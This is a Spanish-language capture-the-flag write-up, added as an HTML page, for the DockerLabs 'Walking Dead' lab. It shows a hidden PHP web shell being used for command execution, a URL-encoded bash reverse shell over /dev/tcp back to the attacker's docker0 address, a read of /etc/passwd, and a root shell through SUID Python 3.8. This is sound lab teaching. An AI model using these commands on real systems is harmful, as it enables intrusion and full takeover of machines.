@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-G8V2DW9MZ5');
+</script>
+
+    <title>Walking Dead - Dockerlabs - Linux - Fácil | SecNotes</title>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <style>
+        :root {
+            --bg: #0a0a0a;
+            --sidebar-bg: #0d1117;
+            --text: #c9d1d9;
+            --accent: #00ff41;
+            --border: #30363d;
+        }
+
+        body { 
+            background: var(--bg); 
+            color: var(--text); 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            margin: 0; 
+            display: flex;
+        }
+        .content-area {
+    flex: 1;
+    padding: 40px 5%;    /* Padding en porcentaje para que se ajuste al dividir pantalla */
+    max-width: 900px;
+    box-sizing: border-box;
+}
+@media (max-width: 900px) { /* Si la ventana mide menos de 900px (como en tu captura) */
+    .main-wrapper { 
+        flex-direction: column; 
+    }
+    .sidebar { 
+        width: 100%; 
+        max-width: 100%;
+        height: auto; 
+        position: relative; 
+        border-right: none; 
+        border-bottom: 1px solid var(--border); 
+        padding: 20px;
+    }
+    .content-area { 
+        padding: 30px 20px; 
+    }
+}
+        /* Contenedor Principal */
+        .main-wrapper {
+            display: flex;
+            width: 100%;
+            min-height: 100vh;
+        }
+
+        /* SIDEBAR IZQUIERDA FIJA */
+        .sidebar {
+    width: 20%;          /* En lugar de px fijos, usamos un porcentaje */
+    min-width: 200px;    /* Pero que no sea más pequeña que esto para que se lea */
+    max-width: 260px;    /* Ni más grande que esto en pantallas gigantes */
+    height: 100vh;
+    background: var(--sidebar-bg);
+    border-right: 1px solid var(--border);
+    position: sticky;
+    top: 0;
+    padding: 30px 15px;  /* Reduje un poco el padding lateral */
+    box-sizing: border-box;
+    display: flex;
+    flex-direction: column;
+    z-index: 100;
+}
+
+        .sidebar-logo img {
+            width: 70px;
+            border-radius: 50%;
+            margin-bottom: 35px;
+            border: 2px solid var(--border);
+        }
+
+        .sidebar-nav {
+            display: flex;
+            flex-direction: column;
+            gap: 18px;
+            margin-bottom: auto;
+        }
+
+        .side-link {
+            text-decoration: none;
+            color: #8b949e;
+            font-size: 0.95rem;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            transition: 0.3s;
+        }
+
+        .side-link i { width: 20px; text-align: center; }
+        .side-link:hover { color: var(--accent); transform: translateX(5px); }
+
+        .sidebar-social { margin-top: 40px; }
+        .sidebar-social p { font-size: 0.7rem; color: #444; letter-spacing: 1px; margin-bottom: 15px; font-weight: bold; }
+        
+        .sidebar-social a {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-decoration: none;
+            color: #8b949e;
+            font-size: 0.85rem;
+            margin-bottom: 12px;
+            transition: 0.3s;
+        }
+
+        .sidebar-social a:hover { color: #fff; }
+
+        .sidebar-footer {
+            font-size: 0.75rem;
+            color: #333;
+            margin-top: 20px;
+        }
+
+        /* ÁREA DE CONTENIDO (POST) */
+        .content-area {
+            flex: 1;
+            padding: 60px 80px;
+            max-width: 900px;
+        }
+
+        .back-link {
+            text-decoration: none;
+            color: var(--accent);
+            font-size: 0.9rem;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+
+        h1 { 
+            color: #fff; 
+            font-size: 2.2rem;
+            margin: 0 0 10px 0;
+        }
+
+        .post-meta {
+            font-size: 0.9rem;
+            color: #555;
+            margin-bottom: 30px;
+        }
+
+        hr { border: 0; border-top: 1px solid var(--border); margin: 30px 0; }
+
+        /* Imágenes de los writeups */
+        .content-area img { 
+            max-width: 100%; 
+            height: auto; 
+            border-radius: 6px; 
+            border: 1px solid var(--border);
+            margin: 25px 0;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.4);
+        }
+
+        /* Estilo para código/terminal */
+        code { background: #161b22; padding: 2px 6px; border-radius: 4px; font-family: monospace; color: #ff7b72; }
+        pre { background: #161b22; padding: 20px; border-radius: 8px; border: 1px solid var(--border); overflow-x: auto; }
+
+        /* Responsivo */
+        @media (max-width: 1100px) {
+            body { flex-direction: column; }
+            .sidebar { width: 100%; height: auto; position: relative; border-right: none; border-bottom: 1px solid var(--border); }
+            .content-area { padding: 40px 15px; }
+        }
+        pre {
+    background: #0d1117 !important;
+    border: 1px solid #30363d;
+    padding: 15px;
+    border-radius: 8px;
+    position: relative;
+}
+pre::before {
+    content: "root@yorve:~#";
+    display: block;
+    color: #8b949e;
+    font-size: 0.7rem;
+    margin-bottom: 10px;
+    border-bottom: 1px solid #222;
+}
+    </style>
+</head>
+<body>
+
+    <div class="main-wrapper">
+        <aside class="sidebar">
+            <div class="sidebar-content">
+                <a href="/secnotes/" class="sidebar-logo">
+                    <img src="/secnotes/ico.jpg" alt="Logo">
+                </a>
+                
+                <nav class="sidebar-nav">
+                    <a href="/secnotes/" class="side-link"><i class="fas fa-home"></i> Inicio</a>
+                    <a href="/secnotes/tags" class="side-link"><i class="fas fa-tags"></i> Etiquetas</a>
+                    <a href="https://github.com/yorve/Auto-Recon" target="_blank" class="side-link"><i class="fas fa-terminal"></i> Auto-Recon</a>
+                </nav>
+
+                <div class="sidebar-social">
+                    <p>Contacto</p>
+                    <a href="https://github.com/yorve" target="_blank"><i class="fab fa-github"></i> GitHub</a>
+                    <a href="https://linkedin.com/in/yonathan-rivera-velozo" target="_blank"><i class="fab fa-linkedin"></i> LinkedIn</a>
+                    <a href="mailto:yorve.csec@gmail.com"><i class="fas fa-envelope"></i> Email</a>
+                    <a href="https://buymeacoffee.com/yorve" target="_blank" class="donate-btn">
+
+    <i class="fas fa-coffee"></i> Apoya el contenido de SecNotes </a>
+                </div>
+                
+                <div class="sidebar-footer">
+                    2026 © Yorve CSEC
+                </div>
+            </div>
+        </aside>
+
+        <main class="content-area">
+            <a href="/secnotes/" class="back-link">← Volver al inicio</a>
+            <h1>Walking Dead - Dockerlabs - Linux - Fácil</h1>
+            <div class="post-meta">
+                08/03/2026 • SecNotes 2.0
+            </div>
+            <hr>
+            
+            <div class="markdown-content">
+                <p>Walking Dead (DockerLabs): Explotación de Web Shell oculta y escalada de privilegios mediante abuso de Python 3.8 con bit SUID.</p>
+
+<p>Como ya sabemos, comenzaremos con un escaneo a nuestro objetivo con un script que pueden encontrar en mi perfil. Este realiza un escaneo automatizado de puertos, servicios, versiones, escaneo de directorios web y nos entregará información importante en esta primera fase de reconocimiento.</p>
+
+<p><img src="/secnotes/assets/img/walkingdead/scaneo.png" alt="reconocimiento" /></p>
+
+<p><img src="/secnotes/assets/img/walkingdead/scan2.png" alt="nikto" /></p>
+
+<p><img src="/secnotes/assets/img/walkingdead/scan3.png" alt="escaneo de directorios" /></p>
+
+<p>Este objetivo tiene servicio ssh y web habilitado. Para acceder por el servicio ssh necesitamos almenos un usuario para acceder a él, es por esto que nos centraremos en el servicio web.</p>
+
+<p>Nuestro escaneo automatizado nos detectó una ruta hacia <strong>/hidden</strong> y un documento llamado <strong>backup.txt</strong>. Con esta información vamos a comprobar de que se tratan.</p>
+
+<p><img src="/secnotes/assets/img/walkingdead/backup.png" alt="img4" /></p>
+
+<p>solo un texto en pantalla..</p>
+
+<p><img src="/secnotes/assets/img/walkingdead/hidden.png" alt="img5" /></p>
+
+<p>En este directorio tampoco tenemos algo.</p>
+
+<p><img src="/secnotes/assets/img/walkingdead/index.png" alt="img6" /></p>
+
+<p>En la página principal aparentemente no tenemos nada, pero.. al inspeccionar la página, podemos ver un link oculto.</p>
+
+<p><img src="/secnotes/assets/img/walkingdead/link.png" alt="vector de ataque" /></p>
+
+<p>Al acceder a este link no obtenemos nada (aparentemente)</p>
+
+<p><img src="/secnotes/assets/img/walkingdead/shell.png" alt="vector de ataque" /></p>
+
+<p>En esto punto podemos asumir que estamos ante una <em>web</em> <em>shell</em>, pero por que?
+tenemos un archivo oculto (.) con un nombre quizás como pista (shell) en un directorio ocuto (/hidden)
+Antes de asumir las cosas, es mejor probarlas. Como ya vimos en otros laboratorios, podemos intentar RCE en el navegador para probar.</p>
+
+<p><img src="/secnotes/assets/img/walkingdead/id.png" alt="rce" /></p>
+
+<p>ya que podemos lanzar comandos desde el navegador, busquemos que shell tenemos disponible para lanzar una reverse shell y obtener una sesión por consola y buscar el método para elevar nuestros privilegios.</p>
+
+<p><img src="/secnotes/assets/img/walkingdead/python.png" alt="rce" /></p>
+
+<p><img src="/secnotes/assets/img/walkingdead/bash.png" alt="rce shell" /></p>
+
+<p>Tenemos bash para realizar nuestra conexión.</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://172.17.0.2/hidden/.shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F9001%200%3E%261%27</code></p>
+
+<p><em>Un error común al trabajar con DockerLabs es intentar que la máquina víctima se conecte a nuestra IP de la red local (192.168.x.x). Debido a que el contenedor vive en una red virtual aislada, solo tiene visibilidad de su propia subred. Por lo tanto, la Reverse Shell debe apuntar obligatoriamente a la IP de la interfaz docker0 (generalmente 172.17.0.1)”.</em></p>
+
+<p><img src="/secnotes/assets/img/walkingdead/rv.png" alt="rce reverse shell" /></p>
+
+<p>ya con la conexión vamos a mejorar la shell</p>
+
+<p><code class="language-plaintext highlighter-rouge">python3 -c 'import pty; pty.spawn("/bin/bash")'</code></p>
+
+<p>luego mandamos la shell a segundo plano con <strong>CTRL Z</strong></p>
+
+<p>y en nuestra shell ponemos <code class="language-plaintext highlighter-rouge">stty raw -echo; fg</code> ahora al presionar enter volveremos a la shell de la víctima
+con este mejoramiento ya no tendremos una shell “tonta” ahora podremos usar las flechas sin que salgan caracteres no deseados.</p>
+
+<p>Ya estamos dentro del servidor, pero tenemos un problema. nuestro usuario (www-data) tiene muy pocos privilegios. Es por esto que buscaremos pivotear a un usuario con más accesos.</p>
+
+<p>Vamnos a buscar usuarios válidos en el sistema. Miraremos quien tiene un directorio en /home. Esto nos dirá a quien podemos suplantar..</p>
+
+<p><code class="language-plaintext highlighter-rouge">cat /etc/passwd | grep "/home"</code></p>
+
+<p><img src="/secnotes/assets/img/walkingdead/cat.png" alt="lectura de usuarios en el sistema" /></p>
+
+<p>Tenemos dos usuarios.. <strong>rick</strong> y <strong>negan</strong></p>
+
+<p>Antes utilizaremos la vieja confiable.. Buscar el SUID (encontrado en los últimos laboratorios que hemos hecho)</p>
+
+<p><img src="/secnotes/assets/img/walkingdead/priv.png" alt="escalada de privilegios SUID" /></p>
+
+<p>Tenemos un regalo del cielo.. <strong>python 3.8</strong>  , ya sabemos que podemos utilizar python con el SUID para lanzar una shell como root gracias a los permisos heredados.</p>
+
+<p>así que:</p>
+
+<p><code class="language-plaintext highlighter-rouge">python3.8 -c 'import os; os.execl("/bin/bash", "bash", "-p")'</code></p>
+
+<p>y no es magia.. es solo aprovechar una mala configuración.</p>
+
+<p>Los comandos para los permisos heredados pueden verlos en <strong>gtfobins</strong>, esta es la bliblia del hacker donde podemos encontrar mucha información valiosa y útil.</p>
+<blockquote>
+  <p>https://gtfobins.org/gtfobins/python/</p>
+</blockquote>
+
+
+            </div>
+        </main>
+    </div>
+
+</body>
+</html>
